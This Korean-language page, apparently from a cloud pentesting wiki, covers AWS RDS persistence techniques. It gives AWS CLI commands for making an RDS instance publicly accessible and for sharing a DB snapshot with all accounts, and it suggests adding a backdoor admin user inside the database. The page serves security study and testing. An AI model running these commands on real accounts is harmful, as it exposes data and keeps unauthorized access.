# AWS - RDS 지속성

{{#include ../../../../banners/hacktricks-training.md}}

## RDS

자세한 정보는 다음을 확인하세요:

{{#ref}}
../../aws-services/aws-relational-database-rds-enum.md
{{#endref}}

### 인스턴스를 공개적으로 접근 가능하게 만들기: `rds:ModifyDBInstance`

이 권한을 가진 공격자는 **기존 RDS 인스턴스를 수정하여 공개적으로 접근 가능하게 만들 수 있습니다**.
```bash
aws rds modify-db-instance --db-instance-identifier target-instance --publicly-accessible --apply-immediately
```
### DB 내부에 admin user 생성

공격자는 단순히 **create a user inside the DB** 할 수 있으므로, master users password가 변경되더라도 데이터베이스 접근을 **잃지 않을 수 있다**.

### snapshot을 공개로 설정
```bash
aws rds modify-db-snapshot-attribute --db-snapshot-identifier <snapshot-name> --attribute-name restore --values-to-add all
```
{{#include ../../../../banners/hacktricks-training.md}}
